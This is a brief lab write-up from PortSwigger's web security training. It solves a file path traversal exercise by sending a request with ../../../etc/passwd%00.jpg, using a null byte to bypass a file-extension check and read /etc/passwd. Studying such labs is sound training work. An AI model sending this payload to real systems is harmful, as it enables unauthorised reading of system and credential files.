# 6 - Validation of file extension with null byte bypass

> This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.
>
>  The application validates that the supplied filename ends with the expected file extension.
>
>  To solve the lab, retrieve the contents of the `/etc/passwd` file.

![](../../.gitbook/assets/imagen%20%28634%29.png)

```text
GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
```



